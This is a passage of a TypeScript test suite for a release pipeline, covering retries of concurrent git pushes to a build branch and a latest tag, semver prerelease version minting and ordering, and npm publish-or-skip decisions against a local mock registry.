      if (preexisting) {
        git(rival.from, "push", "--quiet", "origin", `${rival.first}:refs/heads/build`);
      }
      const hooks = join(fx.origin, "hooks");
      mkdirSync(hooks, { recursive: true });
      writeFileSync(
        join(hooks, "update"),
        `#!/bin/sh\n[ "$1" = refs/heads/build ] || exit 0\ngit update-ref refs/heads/build ${rival.last}\n`,
        { mode: 0o755 },
      );
      git(fx.origin, "config", "core.hooksPath", hooks);
      let result: ReturnType<typeof advanceBuild> | undefined;
      const pushes = withPushPlans(fx, [], () => {
        result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
      });
      expectRetriedOnto(fx, preexisting ? rival.first : "", rival.last, result, pushes);
    },
  );

  test("GitHub's wording of that server-side compare-and-set loss is retried too", () => {
    const fx = seedFixture();
    const stderr = `To https://github.com/o/r.git\n ! [remote rejected] 0123abc -> build (cannot lock ref 'refs/heads/build': is at ${fx.seedSha} but expected ${fx.mergeSha})\nerror: failed to push some refs to 'https://github.com/o/r.git'\n`;
    let result: ReturnType<typeof advanceBuild> | undefined;
    // The scripted loss lands nothing, so the retry finds no build and pushes the root package again, for real.
    const pushes = withPushPlans(fx, [{ fail: { stderr, status: 1 } }], () => {
      result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
    });
    const tip = buildTip(fx);
    expect(result).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
    const rejected = appendedSha(pushes[0] ?? []);
    expect(pushes).toEqual([appendOf(rejected), appendOf(tip), latestOf("", tip)]);
    expect(parentOf(fx.work, rejected)).toBe("");
    expect(parentOf(fx.origin, tip)).toBe("");
  });

  test("a push overtaken on every attempt gives up naming the concurrent mover", () => {
    const fx = seedFixture();
    const rival = competitors(fx, 3);
    const pushes = withPushPlans(fx, rival.plans, () => {
      expect(() => advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha })).toThrow(
        "could not advance refs/heads/build after 3 attempts; something keeps moving it concurrently - rerun this job once it settles.",
      );
    });
    const shas = pushes.map(appendedSha);
    expect(pushes).toEqual(shas.map(appendOf));
    expect(shas.map((sha) => parentOf(fx.work, sha))).toEqual(["", ...rival.shas.slice(0, -1)]);
    expect(buildTip(fx)).toBe(rival.last);
    expect(remoteRef(fx, "refs/tags/latest")).toBe("");
  });

  test.each(PERMANENT)(
    "%s fails the first push for good, with git's own words",
    (_name, stderr) => {
      const fx = seedFixture();
      let error: unknown;
      const pushes = withPushPlans(fx, [{ fail: { stderr, status: 128 } }], () => {
        try {
          advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
        } catch (thrown) {
          error = thrown;
        }
      });
      const shas = pushes.map(appendedSha);
      expect(pushes).toEqual(shas.map(appendOf));
      expect(shas.map((sha) => parentOf(fx.work, sha))).toEqual([""]);
      expect(error).toEqual(
        new Error(`git push origin ${shas.join()}:refs/heads/build failed: ${stderr.trim()}`),
      );
      expect(remoteRef(fx, "refs/heads/build")).toBe("");
      expect(remoteRef(fx, "refs/tags/latest")).toBe("");
    },
  );

  describe("the latest tag", () => {
    test("a release backfill landing between this run's append and its latest move does not hide this run's newer commit", () => {
      const fx = seedFixture();
      // latest names the seed's package; the 2.1.0 merge was skipped by post-green.
      const older = advanceBuild({
        cwd: checkoutOf(fx, "seed-run", fx.seedSha, "packaged-bundle-bytes-0\n"),
        sourceSha: fx.seedSha,
      }).buildSha;
      const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      // origin's post-receive hook appends the release hook's backfill of the merge commit on top of this run's append, so the tip this run reads
      // next is the backfill.
      const rival = clone(fx.root, fx.origin, "backfill");
      git(rival, "checkout", "--quiet", fx.mergeSha);
      stripWorkflows(rival);
      writeBuild(rival, "packaged-bundle-bytes-1\n");
      stageBuild(rival);
      stripPrepare(rival);
      const rivalTree = git(rival, "write-tree");
      // The tree's objects must already sit in origin for the hook to commit them.
      const holder = git(rival, "commit-tree", rivalTree, "-p", fx.mergeSha, "-m", "holder");
      git(rival, "push", "--quiet", "origin", `${holder}:refs/heads/backfill-objects`);
      const hooks = join(fx.origin, "hooks");
      const once = join(fx.root, "backfilled");
      mkdirSync(hooks, { recursive: true });
      writeFileSync(
        join(hooks, "post-receive"),
        [
          "#!/bin/sh",
          `[ -e "${once}" ] && exit 0`,
          "while read -r old new ref; do",
          '  [ "$ref" = refs/heads/build ] || continue',
          `  : > "${once}"`,
          `  sha=$(git -c user.name=hook -c user.email=hook@example.invalid commit-tree ${rivalTree} -p "$new" -m "build: by the release hook" -m "Source: ${fx.mergeSha}")`,
          '  git update-ref refs/heads/build "$sha" "$new"',
          "done",
          "",
        ].join("\n"),
        { mode: 0o755 },
      );
      git(fx.origin, "config", "core.hooksPath", hooks);
      let result: ReturnType<typeof advanceBuild> | undefined;
      const pushes = withPushPlans(fx, [], () => {
        result = advanceBuild({ cwd: next.dir, sourceSha: next.sha });
      });
      const tip = buildTip(fx);
      const own = git(fx.origin, "rev-parse", `${tip}^`);
      expect(sourceTrailer(fx.origin, tip)).toBe(fx.mergeSha);
      expect(sourceTrailer(fx.origin, own)).toBe(next.sha);
      expect(git(fx.origin, "rev-parse", `${own}^`)).toBe(older);
      expect(result).toEqual({
        changed: true,
        buildSha: own,
        latestSha: own,
        reason: `refs/heads/build: advanced to ${own}; refs/tags/latest: moved to ${own}`,
      });
      expect(pushes).toEqual([appendOf(own), latestOf(older, own)]);
      expect(latestTag(fx)).toBe(own);
      const rerun = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
      expect(rerun).toEqual({
        changed: false,
        buildSha: tip,
        latestSha: own,
        reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest stays at ${own} (built from ${next.sha}), newer than ${tip} (built from ${fx.mergeSha}); the next green push appends past it`,
      });
      expect(latestTag(fx)).toBe(own);
    });

    test("a stale rerun after the release hook appended an older source leaves latest on the newer source until a green push passes it", () => {
      const fx = seedFixture();
      // Post-green skipped the 2.1.0 merge; the next green commit reached build first.
      const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      const newer = advanceBuild({ cwd: next.dir, sourceSha: next.sha }).buildSha;
      const release = checkoutOf(fx, "release-backfill", fx.mergeSha, "packaged-bundle-bytes-1\n");
      const older = packageRelease({
        cwd: release,
        tag: "v2.1.0",
        sourceSha: fx.mergeSha,
      }).packagedSha;
      expect(buildTip(fx)).toBe(older);
      expect(latestTag(fx)).toBe(newer);
      let result: ReturnType<typeof advanceBuild> | undefined;
      const pushes = withPushPlans(fx, [], () => {
        result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
      });
      expect(result).toEqual({
        changed: false,
        buildSha: older,
        latestSha: newer,
        reason: `refs/heads/build already packages ${fx.mergeSha} at ${older}; refs/tags/latest stays at ${newer} (built from ${next.sha}), newer than ${older} (built from ${fx.mergeSha}); the next green push appends past it`,
      });
      expect(pushes).toEqual([]);
      expect(latestTag(fx)).toBe(newer);
      const third = pushGreenCommit(fx, "third-green", "packaged-bundle-bytes-3\n");
      const moved = advanceBuild({ cwd: third.dir, sourceSha: third.sha });
      expect(moved).toEqual({
        changed: true,
        buildSha: buildTip(fx),
        latestSha: buildTip(fx),
        reason: advanced(buildTip(fx)),
      });
      expect(git(fx.origin, "rev-parse", `${buildTip(fx)}^`)).toBe(older);
      expect(latestTag(fx)).toBe(buildTip(fx));
    });

    test("a lease overtaken by another mover is retried on the re-observed tag", () => {
      const fx = seedFixture();
      const first = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
      const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      let result: ReturnType<typeof advanceBuild> | undefined;
      const pushes = withPushPlans(
        fx,
        [null, { competitor: { from: fx.work, sha: fx.seedSha, ref: "refs/tags/latest" } }],
        () => {
          result = advanceBuild({ cwd: next.dir, sourceSha: next.sha });
        },
      );
      const tip = buildTip(fx);
      expect(result).toEqual({
        changed: true,
        buildSha: tip,
        latestSha: tip,
        reason: advanced(tip),
      });
      expect(pushes).toEqual([appendOf(tip), latestOf(first, tip), latestOf(fx.seedSha, tip)]);
      expect(latestTag(fx)).toBe(tip);
    });

    test("a lease overtaken on every attempt gives up after build advanced", () => {
      const fx = seedFixture();
      advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
      const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      const movers = [fx.seedSha, fx.mergeSha, fx.seedSha];
      const pushes = withPushPlans(
        fx,
        [
          null,
          ...movers.map((sha) => ({ competitor: { from: fx.work, sha, ref: "refs/tags/latest" } })),
        ],
        () => {
          expect(() => advanceBuild({ cwd: next.dir, sourceSha: next.sha })).toThrow(
            "could not move refs/tags/latest after 3 compare-and-swap attempts; something keeps moving it concurrently - rerun this job once it settles.",
          );
        },
      );
      const tip = buildTip(fx);
      expect(sourceTrailer(fx.origin, tip)).toBe(next.sha);
      const first = git(fx.origin, "rev-parse", `${tip}^`);
      expect(pushes).toEqual([
        appendOf(tip),
        latestOf(first, tip),
        latestOf(fx.seedSha, tip),
        latestOf(fx.mergeSha, tip),
      ]);
      expect(latestTag(fx)).toBe(fx.seedSha);
    });

    test.each(PERMANENT)(
      "%s fails the first lease push for good, after build advanced",
      (_name, stderr) => {
        const fx = seedFixture();
        let error: unknown;
        const pushes = withPushPlans(fx, [null, { fail: { stderr, status: 128 } }], () => {
          try {
            advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
          } catch (thrown) {
            error = thrown;
          }
        });
        const tip = buildTip(fx);
        expect(pushes).toEqual([appendOf(tip), latestOf("", tip)]);
        expect(error).toEqual(
          new Error(
            `git push --force-with-lease=refs/tags/latest: origin ${tip}:refs/tags/latest failed: ${stderr.trim()}`,
          ),
        );
        expect(remoteRef(fx, "refs/tags/latest")).toBe("");
      },
    );
  });
});

describe("release configuration contract", () => {
  test("the committed config pins the tagless-draft knobs (shape only; the flow itself is not exercised here)", () => {
    const config = JSON.parse(
      readFileSync(join(import.meta.dir, "../../release-please-config.json"), "utf8"),
    ) as {
      "skip-github-release"?: unknown;
      "include-component-in-tag"?: unknown;
      "last-release-sha"?: unknown;
      packages: Record<string, Record<string, unknown>>;
    };
    const root = config.packages["."];
    // release-please must never create a tag on main; the hook mints the only tag, on the build chain commit.
    //   draft: true + force-tag-creation: false  -> explicit, since the upstream default could change
    //   include-component-in-tag: false          -> tags stay strictly vX.Y.Z, the one shape releaseMajor() accepts
    //   skip-github-release unset                -> set, release_created never fires and the hook never runs
    expect(root?.draft).toBe(true);
    expect(root?.["force-tag-creation"]).toBe(false);
    expect(config["skip-github-release"]).toBeUndefined();
    expect(config["include-component-in-tag"]).toBe(false);
    expect(typeof config["last-release-sha"]).toBe("string");
  });
});

describe("release tag shape", () => {
  test("a non-vX.Y.Z tag mints nothing", () => {
    const fx = seedFixture();
    expect(() =>
      packageRelease({ cwd: fx.work, tag: "v2.1-rc.0", sourceSha: fx.mergeSha }),
    ).toThrow(/not a vX\.Y\.Z release tag/);
    expect(remoteRef(fx, "refs/tags/v2.1-rc.0")).toBe("");
    expect(remoteRef(fx, "refs/heads/build")).toBe("");
  });
});

/** The version grammar as semver.org states it: what npm holds a version to
 * before it normalizes one (a bare all-digit identifier loses its leading zero). */
const SEMVER =
  /^(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(?:-((?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\.(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?(?:\+([0-9a-zA-Z-]+(?:\.[0-9a-zA-Z-]+)*))?$/;

describe("prereleaseVersion", () => {
  const sha = "b8df084c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a";
  const minted: [string, string, string, string][] = [
    ["2.0.0", "412", sha, "2.0.1-main.412.gb8df084"],
    ["2.9.9", "7", sha, "2.9.10-main.7.gb8df084"],
    ["0.0.0", "0", sha, "0.0.1-main.0.gb8df084"],
    // The sha7 that would be rewritten to 123456 as a bare identifier.
    ["2.0.0", "412", "0123456789abcdef0123456789abcdef01234567", "2.0.1-main.412.g0123456"],
  ];
  test.each(minted)("manifest %s at run %s of %s mints %s", (manifest, run, source, expected) => {
    const version = prereleaseVersion(manifest, run, source);
    expect(version).toBe(expected);
    expect(version).toMatch(SEMVER);
  });

  const refusedInputs: [string, [string, string, string], RegExp][] = [
    ["a manifest version with a pre-release", ["2.0.0-rc.1", "412", sha], /is not X\.Y\.Z/],
    ["a manifest version missing its patch", ["2.0", "412", sha], /is not X\.Y\.Z/],
    ["a run number with a leading zero", ["2.0.0", "0412", sha], /not a decimal integer/],
    ["an empty run number", ["2.0.0", "", sha], /not a decimal integer/],
    ["a short sha", ["2.0.0", "412", "b8df084"], /not a full commit sha/],
    ["an upper-case sha", ["2.0.0", "412", sha.toUpperCase()], /not a full commit sha/],
  ];
  test.each(refusedInputs)("%s is refused", (_name, args, error) => {
    expect(() => prereleaseVersion(...args)).toThrow(error);
  });

  test("the checkout's version names the manifest at HEAD and the source it was told, which HEAD must be", () => {
    const fx = seedFixture();
    expect(prereleaseVersionOf({ cwd: fx.work, sourceSha: fx.mergeSha, runNumber: "412" })).toBe(
      `2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}`,
    );
    expect(() =>
      prereleaseVersionOf({ cwd: fx.work, sourceSha: fx.seedSha, runNumber: "412" }),
    ).toThrow(
      `the checkout is at ${fx.mergeSha}, not the source commit ${fx.seedSha} whose build is published.`,
    );
  });

  /** Run the script's subcommand under this bun as the workflow does: stdout,
   * stderr, and status as they were. Asynchronous, so a registry served from
   * this process can answer the child. */
  async function subcommand(
    cwd: string,
    env: Record<string, string | undefined>,
    ...args: string[]
  ): Promise<{ stdout: string; stderr: string; status: number }> {
    const script = join(import.meta.dir, "..", "..", ".github", "scripts", "release-pipeline.ts");
    const child = Bun.spawn([process.execPath, script, ...args], {
      cwd,
      env: Object.fromEntries(
        Object.entries({ ...process.env, ...env }).filter(([, v]) => v !== undefined),
      ) as Record<string, string>,
      stdin: "ignore",
      stdout: "pipe",
      stderr: "pipe",
    });
    const [stdout, stderr, status] = await Promise.all([
      new Response(child.stdout).text(),
      new Response(child.stderr).text(),
      child.exited,
    ]);
    return { stdout, stderr, status };
  }

  test("the subcommand prints the version alone on stdout, and nothing there when it fails", async () => {
    const fx = seedFixture();
    expect(
      await subcommand(
        fx.work,
        { GITHUB_SHA: fx.mergeSha, GITHUB_RUN_NUMBER: "412" },
        "prerelease-version",
      ),
    ).toEqual({
      stdout: `2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}\n`,
      stderr: "",
      status: 0,
    });
    const failed = await subcommand(
      fx.work,
      { GITHUB_SHA: fx.mergeSha, GITHUB_RUN_NUMBER: undefined },
      "prerelease-version",
    );
    expect(failed).toEqual({
      stdout: "",
      stderr:
        'release-pipeline prerelease-version: GITHUB_RUN_NUMBER is required for "prerelease-version"\n',
      status: 1,
    });
  });

  const sha7 = "b8df084";
  const orderings: [string, string, "newer" | "same" | "older"][] = [
    ["2.1.0", "2.0.9", "newer"],
    ["2.0.1", "2.0.1-main.412.gb8df084", "newer"],
    ["2.0.1-main.412.gb8df084", "2.0.1", "older"],
    ["2.0.1-main.412.gb8df084", "2.1.0", "older"],
    ["2.0.1-main.413.g0000000", "2.0.1-main.412.gffffff0", "newer"],
    ["2.0.1-main.412.gb8df084", "2.0.1-main.412.gb8df084", "same"],
    ["2.0.1-main.412.gb8df085", "2.0.1-main.412.gb8df084", "newer"],
    ["2.0.10", "2.0.9", "newer"],
  ];
  test.each(orderings)("%s is %s than %s", (a, b, expected) => {
    expect(versionOrder(a, b)).toBe(expected);
  });

  test("a version this pipeline never mints is refused, not ordered", () => {
    expect(() => versionOrder("2.0.1-beta.1", "2.0.1")).toThrow(
      /not a version this pipeline mints/,
    );
    expect(() => versionOrder("2.0.1", "2.0.1-main.412.b8df084")).toThrow(
      /not a version this pipeline mints/,
    );
  });

  const registry = (versions: string[], tags: Record<string, string>): Packument => ({
    versions: Object.fromEntries(versions.map((v) => [v, {}])),
    "dist-tags": tags,
  });
  const nextVerdicts: [string, string, Packument | null, PublishVerdict][] = [
    [
      "a package the registry has never seen",
      `2.0.1-main.412.g${sha7}`,
      null,
      { publish: true, version: `2.0.1-main.412.g${sha7}` },
    ],
    [
      "the first pre-release after a release",
      `2.0.1-main.412.g${sha7}`,
      registry(["2.0.0"], { latest: "2.0.0" }),
      { publish: true, version: `2.0.1-main.412.g${sha7}` },
    ],
    [
      "a later run",
      `2.0.1-main.413.g${sha7}`,
      registry(["2.0.0", "2.0.1-main.412.g1111111"], {
        latest: "2.0.0",
        next: "2.0.1-main.412.g1111111",
      }),
      { publish: true, version: `2.0.1-main.413.g${sha7}` },
    ],
    [
      "the release merge's own run (next stays above the stable that follows)",
      `2.1.1-main.500.g${sha7}`,
      registry(["2.0.0", "2.0.1-main.412.g1111111"], {
        latest: "2.0.0",
        next: "2.0.1-main.412.g1111111",
      }),
      { publish: true, version: `2.1.1-main.500.g${sha7}` },
    ],
    [
      "a rerun of a run that already published",
      `2.0.1-main.412.g${sha7}`,
      registry(["2.0.0", `2.0.1-main.412.g${sha7}`], {
        latest: "2.0.0",
        next: `2.0.1-main.412.g${sha7}`,
      }),
      {
        publish: false,
        version: `2.0.1-main.412.g${sha7}`,
        reason: `2.0.1-main.412.g${sha7} is already on the registry`,
      },
    ],
    [
      "a retry of an old run after a newer run published",
      `2.0.1-main.412.g${sha7}`,
      registry(["2.0.0", "2.0.1-main.413.g2222222"], {
        latest: "2.0.0",
        next: "2.0.1-main.413.g2222222",
      }),
      {
        publish: false,
        version: `2.0.1-main.412.g${sha7}`,
        reason: `the registry's next is 2.0.1-main.413.g2222222, not older than 2.0.1-main.412.g${sha7}, so this stale run publishes nothing (npm publish --tag next would move next back)`,
      },
    ],
    [
      "a retry of an old run after a release shipped",
      `2.0.1-main.412.g${sha7}`,
      registry(["2.0.0", "2.1.0"], { latest: "2.1.0" }),
      {
        publish: false,
        version: `2.0.1-main.412.g${sha7}`,
        reason: `the registry's latest is 2.1.0, not older than 2.0.1-main.412.g${sha7}, so this stale run publishes nothing (npm publish --tag next would move next back)`,
      },
    ],
    [
      "the first CI run after the hand bootstrap, whatever dist-tag the registry gave it",
      `2.0.1-main.412.g${sha7}`,
      registry(["2.0.1-main.0.g0000000"], {
        latest: "2.0.1-main.0.g0000000",
        next: "2.0.1-main.0.g0000000",
      }),
      { publish: true, version: `2.0.1-main.412.g${sha7}` },
    ],
  ];
  test.each(nextVerdicts)("next: %s", (_name, version, packument, expected) => {
    expect(nextPublishVerdict(version, packument)).toEqual(expected);
  });

  const stableVerdicts: [string, string, Packument | null, PublishVerdict][] = [
    ["a package the registry has never seen", "2.1.0", null, { publish: true, version: "2.1.0" }],
    [
      "the release after the bootstrap pre-release",
      "2.1.0",
      registry(["2.0.1-main.0.g0000000"], {
        latest: "2.0.1-main.0.g0000000",
        next: "2.0.1-main.0.g0000000",
      }),
      { publish: true, version: "2.1.0" },
    ],
    [
      "a newer release",
      "2.1.0",
      registry(["2.0.0", "2.0.1-main.412.g1111111"], {
        latest: "2.0.0",
        next: "2.0.1-main.412.g1111111",
      }),
      { publish: true, version: "2.1.0" },
    ],
    [
      "a rerun of the release's job",
      "2.1.0",
      registry(["2.0.0", "2.1.0"], { latest: "2.1.0" }),
      { publish: false, version: "2.1.0", reason: "2.1.0 is already on the registry" },
    ],
    [
      "a release taking latest over from a bootstrap pre-release that sorts above it",
      "2.1.0",
      registry(["2.1.1-main.0.g0000000"], {
        latest: "2.1.1-main.0.g0000000",
        next: "2.1.1-main.0.g0000000",
      }),
      { publish: true, version: "2.1.0" },
    ],
    [
      "a rerun of an older release's job after a newer release",
      "2.1.0",
      registry(["2.0.0", "2.2.0"], { latest: "2.2.0" }),
      {
        publish: false,
        version: "2.1.0",
        reason:
          "the registry's latest is 2.2.0, newer than 2.1.0, so this rerun of an older release publishes nothing (npm publish would move latest back)",
      },
    ],
  ];
  test.each(stableVerdicts)("stable: %s", (_name, version, packument, expected) => {
    expect(stablePublishVerdict(version, packument)).toEqual(expected);
  });

  test("stable: a built package.json that is not the tag's version stops before the registry is asked", async () => {
    const fx = seedFixture();
    const asked = await withRegistry({ status: 404 }, async (registry, requests) => {
      await expect(
        npmVerdict({
          cwd: fx.work,
          channel: "stable",
          sourceSha: fx.mergeSha,
          tag: "v2.2.0",
          registry,
        }),
      ).rejects.toThrow(
        "package.json at the release source is version 2.1.0, but the release tag is v2.2.0; refusing to publish a version this source did not release.",
      );
      return requests;
    });
    expect(asked).toEqual([]);
  });

  /** A registry serving one packument (or the status given) for the fixture's package, on a local port. */
  function withRegistry<T>(
    answer: { status: number; body?: unknown },
    body: (url: string, requests: string[]) => Promise<T>,
  ): Promise<T> {
    const requests: string[] = [];
    const server = Bun.serve({
      port: 0,
      fetch(request) {
        requests.push(new URL(request.url).pathname);
        return answer.body === undefined
          ? new Response("", { status: answer.status })
          : Response.json(answer.body, { status: answer.status });
      },
    });
    return body(`http://127.0.0.1:${server.port}`, requests).finally(() => server.stop(true));
  }

  test("the verdict reads the registry's record of the package named in package.json, and 404 is an unpublished package", async () => {
    const fx = seedFixture();
    const verdict = await withRegistry({ status: 404 }, async (registry, requests) => {
      const result = await npmVerdict({
        cwd: fx.work,
        channel: "next",
        sourceSha: fx.mergeSha,
        runNumber: "412",
        registry,
      });
      return { result, requests };
    });
    expect(verdict).toEqual({
      result: { publish: true, version: `2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}` },
      requests: ["/@scope%2Fpkg"],
    });
  });

  test("the verdict skips what the registry already holds on both channels", async () => {
    const fx = seedFixture();
    const held = { versions: { "2.1.0": {}, "2.2.0": {} }, "dist-tags": { latest: "2.2.0" } };
    await withRegistry({ status: 200, body: held }, async (registry) => {
      expect(
        await npmVerdict({
          cwd: fx.work,
          channel: "stable",
          sourceSha: fx.mergeSha,
          tag: "v2.1.0",
          registry,
        }),
      ).toEqual({
        publish: false,
        version: "2.1.0",
        reason: "2.1.0 is already on the registry",
      });
      expect(
        await npmVerdict({
          cwd: fx.work,
          channel: "next",
          sourceSha: fx.mergeSha,
          runNumber: "412",
          registry,
        }),
      ).toEqual({
        publish: false,
        version: `2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}`,
        reason: `the registry's latest is 2.2.0, not older than 2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}, so this stale run publishes nothing (npm publish --tag next would move next back)`,
      });
    });
  });

  const malformed: [string, unknown, RegExp | string][] = [
    ["an empty object", {}, "is not a packument (an object with versions and dist-tags records)"],
    ["an array", [], /is not a packument/],
    ["versions as a list", { versions: ["2.1.0"], "dist-tags": {} }, /is not a packument/],
    [
      "a dist-tag naming a non-string",
      { versions: {}, "dist-tags": { latest: 210 } },
      /names dist-tag latest as 210, not a version/,
    ],
  ];
  test.each(malformed)(
    "a 200 body that is %s stops the verdict, not an empty registry",
    async (_name, body, error) => {
      const fx = seedFixture();
      await withRegistry({ status: 200, body }, async (registry) => {
        await expect(
          npmVerdict({
            cwd: fx.work,
            channel: "stable",
            sourceSha: fx.mergeSha,
            tag: "v2.1.0",
            registry,
          }),
        ).rejects.toThrow(error);
      });
    },
  );

  test("a registry that answers anything but 200 or 404 stops the verdict instead of publishing blind", async () => {
    const fx = seedFixture();
    await withRegistry({ status: 503 }, async (registry) => {
      await expect(
        npmVerdict({
          cwd: fx.work,
          channel: "stable",
          sourceSha: fx.mergeSha,
          tag: "v2.1.0",
          registry,
        }),
      ).rejects.toThrow(
        `the registry answered 503 for @scope/pkg (${registry}/@scope%2Fpkg); refusing to publish without knowing what it holds.`,
      );
    });
  });

  test("the npm-verdict subcommand prints publish or skip on stdout, and the channel is required", async () => {
    const fx = seedFixture();
    await withRegistry({ status: 404 }, async (registry) => {
      expect(
        await subcommand(
          fx.work,
          { GITHUB_SHA: fx.mergeSha, GITHUB_RUN_NUMBER: "412", NPM_REGISTRY_URL: registry },
          "npm-verdict",
          "next",
        ),
      ).toEqual({
        stdout: `publish 2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}\n`,
        stderr: "",
        status: 0,
      });
      expect(
        await subcommand(
          fx.work,
          { GITHUB_SHA: fx.mergeSha, TAG: "v2.1.0", NPM_REGISTRY_URL: registry },
          "npm-verdict",
          "stable",
        ),
      ).toEqual({ stdout: "publish 2.1.0\n", stderr: "", status: 0 });
    });
    await withRegistry(
      { status: 200, body: { versions: { "2.1.0": {} }, "dist-tags": { latest: "2.1.0" } } },
      async (registry) => {
        expect(
          await subcommand(
            fx.work,
            { GITHUB_SHA: fx.mergeSha, TAG: "v2.1.0", NPM_REGISTRY_URL: registry },
            "npm-verdict",
            "stable",
          ),
        ).toEqual({ stdout: "skip 2.1.0 is already on the registry\n", stderr: "", status: 0 });
      },
    );
    expect(await subcommand(fx.work, { GITHUB_SHA: fx.mergeSha }, "npm-verdict")).toEqual({
      stdout: "",
      stderr:
        "release-pipeline npm-verdict: npm-verdict takes the channel, next or stable, not null\n",
      status: 1,
    });
  });
});
